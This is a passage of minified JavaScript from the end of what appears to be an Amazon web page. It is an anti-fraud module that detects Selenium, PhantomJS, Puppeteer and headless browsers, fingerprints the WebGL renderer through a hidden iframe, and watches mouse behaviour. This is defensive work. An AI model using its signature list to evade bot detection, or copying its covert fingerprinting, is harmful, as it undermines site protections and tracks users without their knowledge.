"addEventListener":"attachEvent";(0,window[c])("attachEvent"==c?"onmessage":"message",function(c){a(c[c.message?"message":"data"])},!1)},V=function(a,c){"function"===typeof a&&Math.random()<c/100&&a.call(this)},v=function(a){try{for(var c=Array.prototype.slice.call(arguments,1),b=0;b<c.length;b++){if(!a)return!0;var d=a[c[b]];if(null===d||void 0===d)return!0;a=d}return!1}catch(e){return!0}},C=function(a){try{if(!a)return a;for(var c=Array.prototype.slice.call(arguments,1),b,d=0;d<c.length;d++){b=
a[c[d]];if(!b)break;a=b}return b}catch(e){return null}},W=function(a,c){try{if(!a)return!1;for(var b=Array.prototype.slice.call(arguments,2),d=0;d<b.length;d++){var e=a[b[d]];if(null===e||void 0===e)return d===b.length-1?typeof e===c:!1;a=e}return typeof e===c}catch(n){return!1}},I=function(a){a&&document.body&&a.parentNode===document.body&&document.body.removeChild(a)},J=function(a,c,b){var d=window.document.createElement("IFRAME");d.id=c;d.height="5px";d.width="5px";d.src=b?b:"javascript:'1'";d.style.position=
"absolute";d.style.top="-10000px";d.style.left="-10000px";d.style.visibility="hidden";d.style.opacity=0;window.document.body.appendChild(d);try{var e=d.contentDocument;if(e&&(e.open(),e.writeln("<!DOCTYPE html><html><head><title></title></head><body></body></html>"),e.close(),a)){var r=e.createElement("script");r&&(r.type="text/javascript",r.text=a,e.body.appendChild(r))}}catch(q){n(q,"JS exception while injecting iframe")}return d},n=function(a,c){t.ueLogError(a,{logLevel:"ERROR",attribution:"A9TQForensics",
message:c})},X=function(a,c,b){a={vfrd:1===c?"8":"4",dbg:a};"object"===typeof b?a.info=JSON.stringify(b):"string"===typeof b&&(a.info=b);return{server:window.location.hostname,fmp:a}};(function(a){function c(a,c,b){var d="chrm msie ffox sfri opra phnt slnm othr extr xpcm invs poev njs cjs rhn clik1 rfs uam clik stln mua nfo hlpx clkh mmh chrm1 chrm2 wgl srvr zdim nomime chrm3 otch ivm.tst ivm.clk mmh2 clkh2 achf nopl spfp4 uam1 lsph nmim1 slnm2 crtt spfp misp spfp1 spfp2 clik2 clik3 spfp3 estr".split(" ");
F=a<d.length?d[a]:"othr";t.ue&&t.ue.event&&t.ue.event(X(F,c,b),"a9_tq","a9_tq.FraudMetrics.3")}function b(){var c=!1,g="",b=6,d=function(a,c){var f,g,b=!1;for(f in a)b=b||-1<c.indexOf(f);if("function"===typeof Object.getOwnPropertyNames)for(f=Object.getOwnPropertyNames(a),g=0;g<f.length;g++)b=b||-1<c.indexOf(f[g]);if("function"===typeof Object.keys)for(f=Object.keys(a),g=0;g<f.length;g++)b=b||-1<c.indexOf(f[g]);return b},k=function(a){try{return!!a.toString().match(/\{\s*\[native code\]\s*\}$/m)}catch(c){return!1}},
l=0;"undefined"!==typeof _evaluate&&-1<_evaluate.toString().indexOf("browser.runScript")&&l++;"undefined"!==typeof ArrayBuffer&&"undefined"!==typeof print&&k(ArrayBuffer)&&!k(print)&&l++;"undefined"!==typeof ABORT_ERR&&l++;try{"undefined"!==typeof browser&&"undefined"!==typeof browser._windowInScope&&"undefined"!==typeof browser._windowInScope._response&&l++}catch(w){}3<=l&&(c=!0);k=[function(){if(!0===d(D,"__webdriver_evaluate __selenium_evaluate __fxdriver_evaluate __driver_evaluate __webdriver_unwrapped __selenium_unwrapped __fxdriver_unwrapped __driver_unwrapped __webdriver_script_function __webdriver_script_func __webdriver_script_fn webdriver _Selenium_IDE_Recorder _selenium calledSelenium $cdc_asdjflasutopfhvcZLmcfl_ $chrome_asyncScriptInfo __$webdriverAsyncExecutor".split(" ")))return!0;
var c=function(c){return c.match(/\$[a-z]dc_/)&&a.document[c]&&a.document[c].cache_},f;for(f in D)if(c(f))return g=f,!0;if("function"===typeof Object.getOwnPropertyNames)for(var b=Object.getOwnPropertyNames(D),l=0;l<b.length;l++)if(c(b[l]))return g=f,!0;return!1},function(){return d(a,"_phantom __nightmare _selenium callPhantom callSelenium _Selenium_IDE_Recorder webdriver __webdriverFunc domAutomation domAutomationController __lastWatirAlert __lastWatirConfirm __lastWatirPrompt _WEBDRIVER_ELEM_CACHE".split(" "))||
"function"===typeof a.cdc_adoQpoasnfa76pfcZLmcfl_Promise||"function"===typeof a.cdc_adoQpoasnfa76pfcZLmcfl_Array||"function"===typeof a.cdc_adoQpoasnfa76pfcZLmcfl_Symbol?!0:!1},function(){return a.webdriver||a.document.webdriver||a.document.documentElement.hasAttribute("webdriver")||a.document.documentElement.hasAttribute("selenium")||a.document.documentElement.hasAttribute("driver")||navigator.webdriver||C(p,"navigator","webdriver")||"object"===typeof a.$cdc_asdjflasutopfhvcZLmcfl_||"object"===typeof a.document.$cdc_asdjflasutopfhvcZLmcfl_||
null!=a.name&&-1<a.name.indexOf("driver")?(g=null!=a.name?a.name:"",!0):!1},function(){return a.external&&"function"===typeof a.external.toString&&a.external.toString()&&-1!=a.external.toString().indexOf("Sequentum")?(g=a.external.toString(),!0):!1},function(){for(var c in a){var f;a:{if((f=c)&&33<=f.length&&"function"===typeof a[f]){var b=a[f];if(/\.*_Array$/.test(f)||/\.*_Promise$/.test(f)||/\.*_Symbol$/.test(f)||34===f.length&&"resolve"in b&&"reject"in b&&"prototype"in b||33===f.length&&"isConcatSpreadable"in
b&&"unscopables"in b&&"toStringTag"in b&&"match"in b){f=!0;break a}}f=!1}if(f)return g=c,!0}return!1},function(){var a=!1;if(!u.isFirefox())return!1;var c;c=navigator.userAgent.match(/(firefox(?=\/))\/?\s*(\d+)/i)||[];c=3<=c.length?c[2]:null;if(!c)return!1;60<=c&&void 0===navigator.webdriver?a=!0:60>c&&"webdriver"in navigator&&(a=!0);return a?(b=43,g=c.toString(),!0):!1}];for(l=0;l<k.length;l++)if(k[l].call()){c=!0;break}return{isSel:c,isTest:!1,info:g,headlessCode:b}}function d(a){var g=new Date;
!v(a,"Function","prototype","toString")&&W(g,"function","toLocaleString")&&(a=a.Function.prototype.toString.call(g.toLocaleString))&&100<a.length&&0<=a.indexOf("this.getTime")&&c(41)}function e(){var a="AddChannel AddDesktopComponent AddFavorite AddSearchProvider AddService AddToFavoritesBar AutoCompleteSaveForm AutoScan bubbleEvent ContentDiscoveryReset ImportExportFavorites InPrivateFilteringEnabled IsSearchProviderInstalled IsServiceInstalled IsSubscribed msActiveXFilteringEnabled msAddSiteMode msAddTrackingProtectionList msClearTile msEnableTileNotificationQueue msEnableTileNotificationQueueForSquare150x150 msEnableTileNotificationQueueForSquare310x310 msEnableTileNotificationQueueForWide310x150 msIsSiteMode msIsSiteModeFirstRun msPinnedSiteState msProvisionNetworks msRemoveScheduledTileNotification msReportSafeUrl msScheduledTileNotification msSiteModeActivate msSiteModeAddButtonStyle msSiteModeAddJumpListItem msSiteModeAddThumbBarButton msSiteModeClearBadge msSiteModeClearIconOverlay msSiteModeClearJumpList msSiteModeCreateJumpList msSiteModeRefreshBadge msSiteModeSetIconOverlay msSiteModeShowButtonStyle msSiteModeShowJumpList msSiteModeShowThumbBar msSiteModeUpdateThumbBarButton msStartPeriodicBadgeUpdate msStartPeriodicTileUpdate msStartPeriodicTileUpdateBatch msStopPeriodicBadgeUpdate msStopPeriodicTileUpdate msTrackingProtectionEnabled NavigateAndFind raiseEvent setContextMenu ShowBrowserUI menuArguments onvisibilitychange scrollbar selectableContent version visibility mssitepinned AddUrlAuthentication CloseRegPopup FeatureEnabled GetJsonWebData GetRegValue Log LogShellErrorsOnly OpenPopup ReadFile RunGutsScript SaveRegInfo SetAppMaximizeTimeToRestart SetAppMinimizeTimeToRestart SetAutoStart SetAutoStartMinimized SetMaxMemory ShareEventFromBrowser ShowPopup ShowRadar WriteFile WriteRegValue summonWalrus".split(" "),
g=-1,b,d;"Microsoft Internet Explorer"===navigator.appName?(b=navigator.userAgent,d=/MSIE ([0-9]{1,}[\.0-9]{0,})/,null!==d.exec(b)&&(g=parseFloat(RegExp.$1))):"Netscape"===navigator.appName&&(b=navigator.userAgent,d=/Trident\/.*rv:([0-9]{1,}[\.0-9]{0,})/,null!==d.exec(b)&&(g=parseFloat(RegExp.$1)));if(-1===g&&null===navigator.userAgent.match(/Windows Phone/)&&window.external){for(b=g=0;b<a.length;b++)if("unknown"===typeof window.external[a[b]]){g++;break}0<g&&c(17)}}function B(){var f=a.navigator.userAgent;
if(f&&!/8.0 Safari|iPhone|iPad/.test(f)){var b={clearInterval:42,clearTimeout:41,eval:33,alert:34,prompt:35,scroll:35},d={clearInterval:46,clearTimeout:45,eval:37,alert:38,prompt:39,scroll:39},m=0;if(/Chrome/.test(f))d=b;else if(b=/Firefox/.test(f),f=/Safari/.test(f),!b&&!f)return;if(Function.prototype&&Function.prototype.toString)for(var k in d)"function"===typeof window[k]&&(f=Function.prototype.toString.call(window[k]))&&f.length!==d[k]&&(m+=1);3<=m&&(6<=m?c(40,0,m.toString()):c(40,1,m.toString()))}}
function S(){var a=Math.random().toString(36).substr(2),b=null;U(function(d){try{var m=d.split(" ");if(null!==b&&m[0]===a&&0<m[1].length){var k=JSON.parse(m[1]);for(d=0;d<k.length;d++)1==d&&"R29vZ2xlIFN3aWZ0U2hhZGVy"==k[d]&&c(27)}}catch(l){}});b=J('(function fg45s() {                     var payload = [];                     var canvas = document.createElement("canvas");                     var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl") || canvas.getContext("moz-webgl");                     if (gl != null) {                         var debugInfo = gl.getExtension("WEBGL_debug_renderer_info");                         if (debugInfo != null) {                             payload.push(btoa(gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)));                             payload.push(btoa(gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)));                             parent.postMessage(window.frameElement.id + " " + JSON.stringify(payload), parent.location.origin);                         }                     }                 }             )();',
a);window.setTimeout(function(){try{b&&document.body&&b.parentNode===document.body&&document.body.removeChild(b),b=null}catch(a){n(a,"JS exception while removing iframe")}},5E3)}function L(){function b(){r(a,"mousemove",d);r(a,"click",g)}function g(){try{c(23),b(),r(a.document,l,m)}catch(g){n(g,"JS exception - detectClickDuringTabInactive")}}function d(){try{k||(k=!0,c(24),b(),r(a.document,l,m))}catch(g){n(g,"JS exception - detectMouseMovementsDuringTabInactive")}}function m(){try{var c;"undefined"!==
typeof document.hidden?c="hidden":"undefined"!==typeof document.mozHidden?c="mozHidden":"undefined"!==typeof document.msHidden?c="msHidden":"undefined"!==typeof document.webkitHidden&&(c="webkitHidden");!0!==document[c]===!1?(q(a,"mousemove",d,!1),q(a,"click",g,!1)):b()}catch(l){n(l,"JS exception - handleVisibilityChangeDuringTabInactive")}}var k=!1,l=H(a);T(a,m)}var M=function(){var a=window.navigator,c=a.vendor,b="undefined"!==typeof window.opr,d=-1<a.userAgent.indexOf("Edg"),a=/Chrome/.test(a.userAgent);
return/Google Inc\./.test(c)&&a&&!b&&!d},F=null,N=function(a){var b=[],d=(new Date).getTime(),m=!1,k=!1,l,w,e=function(){r(a,"mousemove",y);r(a,"click",h)},y=function(a){try{var f=(new Date).getTime();if(!(100>f-d)){b.push({x:a.clientX,y:a.clientY});if(50<b.length&&(b.shift(),!(50>b.length))){var l=b[0].x,h=b[49].x,k=b[0].y,m=b[49].y;a=m-k;for(var y=l-h,l=k*h-l*m,h=a/y*-1,w=b[49].ts-b[0].ts,k=!0,m=0;m<b.length;m++)if(0!=a*b[m].x+y*b[m].y+l){k=!1;break}!0==k&&(w={grdt:h,tmsp:w},e(),c(19,0,w))}d=f}}catch(s){n(s,
"JS exception - recordHoverPosition")}},h=function(a){try{var f=a.clientX,d=a.clientY,l={hcc:b.length,cx:f,cy:d};if(0===b.length)e(),c(18,0,l);else if(null!=f&&null!=d){var h;l.hpos=b;var k=b[b.length-1];h=Math.sqrt(Math.pow(f-k.x,2)+Math.pow(d-k.y,2));100<h&&(l.hcc=b.length,l.cx=f,l.cy=d,l.dhp=h,e(),c(15,0,l))}}catch(m){n(m,"JS exception - checkClick")}},s=function(c){try{l=c.clientX,w=c.clientY,m=!0,r(a,"mouseup",s)}catch(b){n(b,"JS exception - checkMouseUp")}},p=function(){try{k=!0,r(a,"mousedown",
p)}catch(c){n(c,"JS exception - checkMouseDown")}},t=function(b){try{m||k||c(49);var d=b.clientX-l,g=b.clientY-w;0<d&&1>d&&0<g&&1>g&&c(50,0,{xDiff:d,yDiff:g});r(a,"click",t)}catch(h){n(h,"JS exception - checkFirstClick")}};q(a,"mousemove",y,!1);q(a,"mouseup",s,!1);q(a,"mousedown",p,!1);q(a,"click",t,!1);q(a,"click",h,!1)},O=function(){if(u.isFirefox()){var a=0;void 0!==window.onstorage&&a++;var b=document.createElement("div");b.style.wordSpacing="22%";"22%"===b.style.wordSpacing&&a++;"function"===
typeof b.getAttributeNames&&a++;b=document.createElement("script");b.type="text/javascript";b.text="class Rectangle {             constructor(height, width) {                 this.height = height;                 this.width = width;             }             get area() {                 return this.calcArea();             }             calcArea() {                 return this.height * this.width;             }             }             const square = new Rectangle(10, 10);             window.__random__str = square.area;";
document.body.appendChild(b);100===window.__random__str&&a++;b&&document.body&&document.body.removeChild(b);2<a&&(void 0===window.onabsolutedeviceorientation||void 0===navigator.permissions)&&c(37,0,a)}},x=function(){return null===navigator.userAgent.match(/(iPad|iPhone|iPod|android|webOS)/i)},G=function(a,b){var d=a&&a.navigator;!d||!x()||d.mimeTypes&&0!=d.mimeTypes.length||(z?c(b,0,"chrm"):u.isFirefox()&&c(b,0,"ff"))},R=function(){var a=function(a,b){for(var c,d="",f={},g={},e=0,h=0;h<b.length;h++)g[b[h]]=
String.fromCharCode(126-h);var e=0,s;for(s in a)-1<b.indexOf(s)&&(f[s]=1,e++);d=d+e+"!";if("function"===typeof Object.getOwnPropertyNames){c=Object.getOwnPropertyNames(a);for(h=e=0;h<c.length;h++)-1<b.indexOf(c[h])&&(f[c[h]]=1,e++);d=d+e+"!"}if("function"===typeof Object.keys){c=Object.keys(a);for(h=e=0;h<c.length;h++)-1<b.indexOf(c[h])&&(f[c[h]]=1,e++);d=d+e+"!"}if("prototype"in Object&&"hasOwnProperty"in Object.prototype)for(s in f)Object.prototype.hasOwnProperty.call(f,s)&&(d+=g[s]);else for(s in f)d+=
g[s];return encodeURIComponent(d)},b=document.createElement("nadu"),a={w:a(window,"SVGFESpotLightElement XMLHttpRequestEventTarget onratechange StereoPannerNode dolphinInfo VTTCue globalStorage WebKitCSSRegionRule MozSmsFilter MediaController mozInnerScreenX onwebkitwillrevealleft DOMMatrix GeckoActiveXObject MediaQueryListEvent PhoneNumberService ServiceWorkerContainer yandex vc2hxtaq9c NavigatorDeviceStorage HTMLHtmlElement ScreenOrientation MSGesture mozCancelRequestAnimationFrame GetSVGDocument MediaSource webkitMediaStream DeviceMotionEvent webkitPostMessage doNotTrack WebKitMediaKeyError HTMLCollection InstallTrigger StorageObsolete CustomEvent orientation XMLHttpRequest Worker showModelessDialog EventSource onmouseleave SVGAnimatedPathData TouchList TextTrackCue onanimationend HTMLBodyElement fluid MSFrameUITab Generator SecurityPolicyViolationEvent ClientRectList SmartCardEvent CSSSupportsRule mmbrowser".split(" ")),
c:a(b.style,"XvPhonemes MozTextAlignLast webkitFilter MozPerspective msTextSizeAdjust OAnimationFillMode borderImageSource MozOSXFontSmoothing border-inline-start-color MozOsxFontSmoothing columns touchAction scroll-snap-coordinate webkitAnimationFillMode webkitLineSnap webkitGridAutoColumns animationDuration isolation overflowWrap offsetRotation webkitShapeOutside MozOpacity position justifySelf borderRight webkitMatchNearestMailBlockquoteColor msImeAlign parentRule MozColumnFill cssText borderRightStyle textOverflow webkitGridRow webkitBackgroundComposite length -moz-column-fill enableBackground flex-basis".split(" "))};
t.ue&&t.ue.event&&(a={vfrd:"0",info:JSON.stringify(a)},t.ue.event({server:window.location.hostname,fmp:a},"a9_tq","a9_tq.FraudMetrics.3"))},P=function(){var b=function(a){try{return"function"!==typeof a||v(p,"Function","prototype","toString")?null:p.Function.prototype.toString.call(a)}catch(b){return null}},d=function(a,c){try{if("function"!==typeof Object.getOwnPropertyDescriptor)return null;var d=Object.getPrototypeOf(a);if(!d)return null;var g=Object.getOwnPropertyDescriptor(d,c);return g?b(g.get):
null}catch(h){return null}},e=function(a){var b=[28,161,141];!v(a,"getDetails","a")&&"s"===a.getDetails.a&&0<=b.indexOf(a.getDetails.l)&&c(45,0,k)},m=function(){(function(){if("function"===typeof Object.getOwnPropertyNames&&x()){var a=Object.getOwnPropertyNames(navigator);a&&1<a.length&&c(47,0,a.length.toString())}})();0<navigator.hardwareConcurrency&&!v(p,"navigator","hardwareConcurrency")&&p.navigator.hardwareConcurrency!==navigator.hardwareConcurrency&&c(48,0,p.navigator.hardwareConcurrency.toString());
(function(){var b=[];if(!v(p,"navigator")){p===a&&(b.push("iwin"),c(51,0,b));for(var d="platform vendor maxTouchPoints userAgent deviceMemory webdriver hardwareConcurrency appVersion mimeTypes plugins languages".split(" "),f=0;f<d.length;f++){var g=d[f],h;if("object"===typeof navigator[g]){h=navigator[g];var e=p.navigator[g],k=!1;h||e?(h&&e?h.length!==e.length?k=!0:0<h.length&&0<e.length&&"string"===typeof h[0]&&h[0]!==e[0]&&(k=!0):k=!0,h=k):h=!1}else h=navigator[g],e=p.navigator[g],h=h||e?h!==e?
!0:!1:!1;h&&b.push(g)}0<b.length&&(0<=b.indexOf("webdriver")?c(51,0,b):c(39,1,b))}})()},k=function(a){if(!a)return null;for(var c={},e=0,k=0,h=0;h<a.length;h++)for(var m=a[h].obj,n=a[h].props,r=0;r<n.length;r++){var p=n[r];c[p]={};var q=C(m,n[r]);if(null===q||void 0===q)k+=1,c[p].a="m",c[p].l=0;else if(q="function"===typeof q?b(q):d(m,p))q&&!/\[native code\]/.test(q)?(c[p].a="s",e+=1):c[p].a="p",c[p].l=q.length}return{sig:c,sCount:e,mCount:k}}([{obj:C(a,"chrome","app"),props:["getDetails","getIsInstalled",
"runningState"]},{obj:a.chrome,props:["csi","loadTimes","runtime"]},{obj:navigator,props:"platform vendor userAgent mimeTypes plugins webdriver languages".split(" ")}]);k&&(e(k.sig),z&&x()&&3<=k.mCount&&(6<=k.mCount?c(46,0,k):c(46,1,k)),m())},Q=function(){var b=a.Document&&a.Document.prototype.evaluate;b&&(a.Document.prototype.evaluate=function(){try{var d=Error("test error"),e=d.stack&&d.stack.toString();e&&e.match(/(puppeteer|phantomjs|apply.xpath)/)&&c(52,0,e);a.Document.prototype.evaluate=b;return b.apply(this,
arguments)}catch(m){return n(m,"JS exception while overidding evaluate"),a.Document.prototype.evaluate=b,b.apply(this,arguments)}})};try{v(navigator,"userAgent")&&c(20);var z=M(),A,p;(a.callPhantom||a._phantom||a.PhantomEmitter||a.__phantomas||/PhantomJS/.test(navigator.userAgent))&&c(5);a.Buffer&&c(12);a.emit&&c(13);a.spawn&&c(14);(null!=a.domAutomation||null!=a.domAutomationController||null!=a._WEBDRIVER_ELEM_CACHE||/HeadlessChrome/.test(navigator.userAgent)||""===navigator.languages)&&c(0);if(u.isChrome()&&
a.webkitRequestFileSystem)a.webkitRequestFileSystem(a.TEMPORARY,1,function(){},function(){c(0)});else if(u.isSafari()&&a.localStorage){try{a.localStorage.setItem("__nadu","")}catch(Z){c(3)}a.localStorage.removeItem("__nadu")}G(a,30);u.isWebkit()&&z&&x()&&(void 0===a.chrome&&c(0),a.chrome&&a.chrome.app&&!1!==a.chrome.app.isInstalled&&void 0!==navigator.languages&&c(31));a.external&&"function"===typeof a.external.toString&&a.external.toString()&&-1<a.external.toString().indexOf("RuntimeObject")&&c(8);
a.FirefoxInterfaces&&"function"===typeof a.FirefoxInterfaces&&a.FirefoxInterfaces("wdICoordinate","wdIMouse","wdIStatus")&&c(2);a.XPCOMUtils&&c(9);(a.Components&&(a.Components.interfaces&&a.Components.interfaces.nsICommandProcessor||a.Components.wdICoordinate||a.Components.wdIMouse||a.Components.wdIStatus||a.Components.classes)||a.netscape&&a.netscape.security&&a.netscape.security.privilegemanager)&&c(8);a.isExternalUrlSafeForNavigation&&c(1);!a.opera||null===a.opera._browserjsran||0!==a.opera._browserjsran&&
!1!==a.opera._browserjsran||c(4);a.screen&&(1>=a.screen.availHeight||1>=a.screen.availWidth||1>=a.screen.height||1>=a.screen.width||0>=a.screen.devicePixelRatio)&&c(10);var E=window.setInterval(function(){try{var a=b();a.isSel&&(c(a.headlessCode,!0===a.isTest?1:0,a.info),window.clearInterval(E),I(A))}catch(d){window.clearInterval(E),n(d,"JS exception - detectSelenium")}},1E3);window.setTimeout(function(){try{window.clearInterval(E),I(A)}catch(a){n(a,"JS exception - clearInterval for detectSelenium")}},
1E4);var K=a.PointerEvent;a.PointerEvent=function(){c(11);if(void 0!==K){var a=Array.prototype.slice.call(arguments);return new K(a)}return null};e();N(a);L();S();0!==a.outerHeight&&0!==a.outerWidth||c(29);O();!x()||navigator.plugins&&0!=navigator.plugins.length||(z?c(38,0,"chrm"):u.isFirefox()&&c(38,0,"ff"));V(R,10);z&&x()&&a.chrome&&!a.chrome.csi&&!a.chrome.loadTimes&&c(25);B();A=J(null,Math.random().toString(36).substr(2));p=v(A,"contentWindow")?a:A.contentWindow;d(p);G(p,42);0===C(navigator,"connection",
"rtt")&&c(44);P();Q()}catch(Y){n(Y,"JS exception - ")}})(B)})(ue_csm,window,document);



}
/* ? */
</script>

</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-eu.amazon.com/1/batch/1/OP/A13V1IB3VIYZZH:258-8387710-9157813:Q2E2JWSX05HN7DAWWE8S$uedata=s:%2Fap%2Fuedata%3Fnoscript%26id%3DQ2E2JWSX05HN7DAWWE8S:0' alt=""/>
</noscript>

<script>window.ue && ue.count && ue.count('CSMLibrarySize', 60964)</script>

<div id="a-white"></div><div id="a-popover-root" style="z-index:-1;position:absolute;"></div></body></html>